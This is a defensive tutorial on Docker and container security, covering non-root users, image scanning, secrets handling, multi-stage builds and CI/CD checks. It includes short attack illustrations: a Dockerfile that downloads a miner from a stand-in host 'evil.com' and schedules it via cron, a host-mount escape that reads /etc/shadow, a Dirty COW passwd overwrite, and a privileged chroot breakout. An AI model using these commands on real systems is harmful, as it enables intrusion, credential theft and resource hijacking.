# Docker & Container Security

## What is Docker?

**Core Concept:**
Docker packages applications with all dependencies together, enabling consistent execution across environments.

**Technical Foundation:**
- Built on existing Linux features (cgroups, namespaces, chroot)
- These features existed but required deep Linux knowledge
- Docker simplified complex container technology for daily usage
- Transformed low-level kernel features into user-friendly tooling

**Critical Understanding:**
Docker is NOT a security tool. It's an application delivery mechanism. Security must be implemented separately.

---

## Container Security Fundamentals

### Default Security Posture

**Risk 1: Root by Default**
```dockerfile
# Default behavior - DANGEROUS
FROM ubuntu:22.04
RUN apt-get update
# Container runs as root (UID 0)
```

**Impact:**
- Containers run as root user by default
- If attacker exploits vulnerability in container → instant root access
- Root in container can potentially escape to host system
- Privilege escalation becomes trivial

**Case Study: Container Escape via Root**

**Scenario:**
Application running in container with root privileges. Attacker finds RCE vulnerability.

**Attack Chain:**
```bash
# Attacker exploits vulnerable app
curl http://victim.com/exploit

# Inside container as root
whoami  # root

# Check for privileged mode
cat /proc/self/status | grep CapEff  # Full capabilities

# Mount host filesystem
mkdir /host
mount /dev/sda1 /host

# Access host system
cat /host/etc/shadow  # Host credentials compromised
```

**Mitigation:**
```dockerfile
FROM ubuntu:22.04

# Create non-root user
RUN groupadd -r appuser && useradd -r -g appuser appuser

# Install dependencies as root
RUN apt-get update && apt-get install -y curl

# Switch to non-root
USER appuser

# Application runs as appuser, not root
CMD ["./app"]
```

---

### Risk 2: Public Image Trust

**Problem:**
Using public images without verification introduces unknown risks.

**Questions to Ask:**
1. Where did this image come from?
2. What's actually inside it?
3. Who maintains it?
4. When was it last updated?
5. What vulnerabilities exist?

**Case Study: Cryptominer in Public Image**

**Scenario:**
Developer pulls popular image from Docker Hub without verification.

**Attack:**
```dockerfile
# Attacker publishes malicious image
FROM node:14
WORKDIR /app

# Legitimate-looking dependencies
COPY package.json .
RUN npm install

# Hidden cryptominer
RUN curl -s https://evil.com/miner -o /tmp/miner && \
    chmod +x /tmp/miner && \
    echo "*/5 * * * * /tmp/miner" | crontab -

COPY . .
CMD ["node", "server.js"]
```

**Impact:**
- Cryptominer runs every 5 minutes
- Consumes CPU resources
- Increases infrastructure costs
- Potential data exfiltration
- Backdoor access established

**Detection:**
```bash
# Scan image before use
trivy image suspicious/image:latest

# Check image layers
docker history suspicious/image:latest

# Inspect running processes
docker exec container_id ps aux
```

**Prevention:**
```bash
# Use official images only
FROM node:14-alpine  # Official Node.js image

# Verify image signature
docker trust inspect node:14-alpine

# Scan before deployment
trivy image --severity HIGH,CRITICAL node:14-alpine
```

---

### Risk 3: Kernel Access

**Problem:**
Containers share the host kernel, unlike VMs.

**Architecture Comparison:**

```
Virtual Machine:
┌─────────────────────┐
│   Application       │
│   Guest OS          │
│   Hypervisor        │
│   Host OS           │
│   Hardware          │
└─────────────────────┘

Container:
┌─────────────────────┐
│   Application       │
│   Container Runtime │
│   Host OS Kernel    │  ← Shared!
│   Hardware          │
└─────────────────────┘
```

**Risk:**
- Kernel vulnerability affects all containers
- Container can potentially exploit kernel bugs
- No kernel-level isolation between containers

**Case Study: Dirty COW Exploit**

**Scenario:**
Linux kernel vulnerability (CVE-2016-5195) allows privilege escalation.

**Exploitation:**
```bash
# Inside unprivileged container
./dirtycow /usr/bin/passwd "hacker::0:0:::/bin/bash"

# Container escapes to host
# Gains root on host system
```

**Mitigation:**
1. Keep kernel updated
2. Use security modules (AppArmor, SELinux)
3. Apply seccomp profiles
4. Implement runtime protection

---

### Risk 4: Secret Management

**Problem:**
Developers often hardcode secrets in images.

**Bad Practices:**

```dockerfile
# WRONG - Hardcoded in Dockerfile
FROM python:3.9
ENV DB_PASSWORD=supersecret123
ENV API_KEY=sk_live_123456789

# WRONG - Stored in image layer
COPY secrets.env /app/
```

**Why It's Dangerous:**
```bash
# Anyone can extract secrets from image
docker save myapp:latest -o myapp.tar
tar -xf myapp.tar
grep -r "DB_PASSWORD" .

# Or inspect history
docker history myapp:latest --no-trunc
```

**Attack Vector:**
1. Image pushed to public/private registry
2. Attacker pulls image
3. Extracts secrets from layers
4. Uses credentials to access production systems

**Correct Approach:**

```dockerfile
FROM python:3.9
WORKDIR /app

# No secrets in image
COPY requirements.txt .
RUN pip install -r requirements.txt

COPY app.py .

# Secrets provided at runtime
CMD ["python", "app.py"]
```

```bash
# Secrets via environment variables
docker run -e DB_PASSWORD=${DB_PASSWORD} myapp:latest

# Or using Docker secrets
echo "supersecret123" | docker secret create db_password -
docker service create --secret db_password myapp:latest

# Or Kubernetes secrets
kubectl create secret generic db-creds --from-literal=password=supersecret123
```

---

## Docker Image Layers

### Layer Architecture

**How Layers Work:**

```dockerfile
FROM ubuntu:22.04           # Layer 1: Base OS
RUN apt-get update          # Layer 2: Package index
RUN apt-get install curl    # Layer 3: Curl package
COPY app.py /app/           # Layer 4: Application
CMD ["python", "/app/app.py"] # Layer 5: Metadata
```

**Layer Structure:**
```
┌─────────────────────────┐
│ CMD (Layer 5)           │ ← Metadata only
├─────────────────────────┤
│ COPY app.py (Layer 4)   │ ← 10 KB
├─────────────────────────┤
│ apt install curl (L3)   │ ← 50 MB
├─────────────────────────┤
│ apt update (Layer 2)    │ ← 20 MB
├─────────────────────────┤
│ ubuntu:22.04 (Layer 1)  │ ← 80 MB
└─────────────────────────┘
Final Image: 160 MB
```

**Key Concept:**
- Each instruction creates a new layer
- Layers are immutable and cached
- Layers are shared between images
- Deleting files doesn't reduce image size if added in earlier layer

---

### Layer Optimization

**Problem: Inefficient Layering**

```dockerfile
# BAD - Creates 3 layers
FROM ubuntu:22.04
RUN apt-get update
RUN apt-get install -y curl
RUN apt-get install -y wget
```

**Optimized Version:**

```dockerfile
# GOOD - Single layer for related operations
FROM ubuntu:22.04
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        curl \
        wget && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*
```

**Benefits:**
- Fewer layers = smaller image
- Better caching strategy
- Cleanup in same layer = actually removes data

---

### Case Study: Secrets in Layers

**Vulnerable Dockerfile:**

```dockerfile
FROM ubuntu:22.04

# Layer 1: Add credentials file
COPY credentials.txt /tmp/

# Layer 2: Use credentials
RUN cat /tmp/credentials.txt > /app/config

# Layer 3: Delete credentials (DOES NOT WORK!)
RUN rm /tmp/credentials.txt
```

**Why it Fails:**
```bash
# Extract image layers
docker save myapp:latest -o myapp.tar
tar -xf myapp.tar

# credentials.txt still exists in Layer 1!
find . -name "credentials.txt"
# ./layer1/tmp/credentials.txt
```

**Correct Approach:**

```dockerfile
FROM ubuntu:22.04

# All in one layer - credentials never stored
RUN --mount=type=secret,id=creds,target=/tmp/creds \
    cat /tmp/creds > /app/config

# Or better - use runtime secrets
CMD ["./app"]
```

```bash
# Build with secret
docker build --secret id=creds,src=credentials.txt -t myapp:latest .
```

---

## Docker Security Best Practices

### 1. Use Minimal Base Images

**Comparison:**

```dockerfile
# BAD - Full OS
FROM ubuntu:22.04  # 80 MB, thousands of packages
```

```dockerfile
# BETTER - Minimal
FROM alpine:3.18   # 5 MB, minimal packages
```

```dockerfile
# BEST - Distroless
FROM gcr.io/distroless/python3  # No shell, no package manager
```

**Security Benefits:**
- Smaller attack surface
- Fewer vulnerabilities
- Less maintenance
- Faster deployments

---

### 2. Multi-Stage Builds

**Problem:**
Build tools and dependencies included in final image.

**Single-Stage (Bad):**

```dockerfile
FROM node:18
WORKDIR /app

# Build dependencies included in final image
COPY package*.json ./
RUN npm install

COPY . .
RUN npm run build

# Dev dependencies still present!
CMD ["node", "dist/server.js"]
```

**Multi-Stage (Good):**

```dockerfile
# Stage 1: Build
FROM node:18 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
RUN npm run build

# Stage 2: Production
FROM node:18-alpine
WORKDIR /app

# Only production dependencies
COPY package*.json ./
RUN npm install --production

# Only built artifacts
COPY --from=builder /app/dist ./dist

USER node
CMD ["node", "dist/server.js"]
```

**Results:**
- Build stage: 500 MB
- Final image: 150 MB
- 70% size reduction
- No build tools in production image

---

### 3. Security Scanning in Build Process

**Integration Pattern:**

```dockerfile
# Dockerfile
FROM python:3.9-slim

RUN groupadd -r appuser && useradd -r -g appuser appuser

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY --chown=appuser:appuser . .

USER appuser
EXPOSE 8080

CMD ["python", "app.py"]
```

**Build Script with Security:**

```bash
#!/bin/bash
set -e

IMAGE_NAME="myapp:${VERSION}"

echo "Building image..."
docker build -t ${IMAGE_NAME} .

echo "Scanning for vulnerabilities..."
trivy image --severity HIGH,CRITICAL --exit-code 1 ${IMAGE_NAME}

echo "Scanning for secrets..."
trivy image --security-checks secret --exit-code 1 ${IMAGE_NAME}

echo "Scanning for misconfigurations..."
trivy config Dockerfile --exit-code 1

echo "Generating SBOM..."
trivy image --format cyclonedx --output sbom.json ${IMAGE_NAME}

echo "All checks passed! Pushing image..."
docker push ${IMAGE_NAME}
```

---

### 4. Runtime Security

**Secure Container Execution:**

```bash
# BAD - Privileged mode
docker run --privileged myapp:latest

# GOOD - Drop all capabilities
docker run \
  --read-only \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  --user 1000:1000 \
  myapp:latest
```

**Kubernetes Security Context:**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
    resources:
      limits:
        memory: "512Mi"
        cpu: "500m"
```

---

## Complete DevSecOps Workflow

### Development Phase

```bash
# 1. Write Dockerfile with security in mind
cat > Dockerfile <<EOF
FROM python:3.9-alpine
RUN addgroup -g 1000 appuser && adduser -D -u 1000 -G appuser appuser
WORKDIR /app
COPY --chown=appuser:appuser requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY --chown=appuser:appuser . .
USER appuser
CMD ["python", "app.py"]
EOF

# 2. Scan Dockerfile
trivy config Dockerfile

# 3. Build image
docker build -t myapp:dev .

# 4. Scan image
trivy image myapp:dev
```

---

### CI/CD Phase

```yaml
# .gitlab-ci.yml
stages:
  - build
  - scan
  - push

build:
  stage: build
  script:
    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .
    
security_scan:
  stage: scan
  image: aquasec/trivy:latest
  script:
    # Vulnerability scan
    - trivy image --exit-code 1 --severity CRITICAL,HIGH $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
    
    # Secret scan
    - trivy fs --security-checks secret --exit-code 1 .
    
    # IaC scan
    - trivy config --exit-code 1 .
    
    # Generate SBOM
    - trivy image --format cyclonedx -o sbom.json $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  artifacts:
    paths:
      - sbom.json

push:
  stage: push
  script:
    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  only:
    - main
```

---

### Production Phase

**Continuous Monitoring:**

```bash
# Regular scans of production images
trivy image --severity CRITICAL production-registry/myapp:v1.2.3

# Runtime monitoring
kubectl logs -f pod-name | grep -i error

# Security audits
docker inspect container-id | jq '.[].HostConfig.Privileged'
```

---

## Common Attack Scenarios & Defenses

### Scenario 1: Image Poisoning

**Attack:**
1. Attacker compromises Docker Hub account
2. Publishes malicious image update
3. Users auto-pull infected image

**Defense:**
```bash
# Use content trust
export DOCKER_CONTENT_TRUST=1
docker pull myimage:latest  # Fails if not signed

# Pin specific digests
FROM nginx@sha256:abc123...

# Scan before use
trivy image nginx:latest
```

---

### Scenario 2: Container Breakout

**Attack:**
```bash
# Privileged container
docker run --privileged -v /:/host ubuntu bash

# Inside container
chroot /host
# Now on host system
```

**Defense:**
```yaml
# Never use privileged mode
securityContext:
  privileged: false
  allowPrivilegeEscalation: false
  capabilities:
    drop: [ALL]
```

---

### Scenario 3: Resource Exhaustion

**Attack:**
```python
# Malicious code in container
while True:
    data.append([0] * 10**6)  # Consume all memory
```

**Defense:**
```yaml
resources:
  limits:
    memory: "512Mi"
    cpu: "500m"
  requests:
    memory: "256Mi"
    cpu: "250m"
```

---

## Summary: Docker Security Checklist

**Image Building:**
- [ ] Use minimal base images (Alpine, Distroless)
- [ ] Run as non-root user
- [ ] Multi-stage builds
- [ ] No secrets in images
- [ ] Scan with Trivy before push
- [ ] Sign images with content trust

**Runtime:**
- [ ] Drop all capabilities
- [ ] Read-only filesystem
- [ ] Resource limits set
- [ ] No privileged mode
- [ ] Security context configured
- [ ] Network policies applied

**Operations:**
- [ ] Regular vulnerability scans
- [ ] SBOM tracking
- [ ] Image signing verification
- [ ] Runtime monitoring
- [ ] Incident response plan
- [ ] Regular security audits

---

## Key Takeaways

1. **Docker is not secure by default** - Security must be implemented
2. **Images are transparent** - Anyone can inspect layers and extract data
3. **Root is dangerous** - Always run as non-root user
4. **Trust but verify** - Scan all images, even official ones
5. **Defense in depth** - Multiple security layers (build, runtime, network)
6. **Automation is critical** - Integrate security into CI/CD pipeline
7. **Continuous monitoring** - Security is ongoing, not one-time


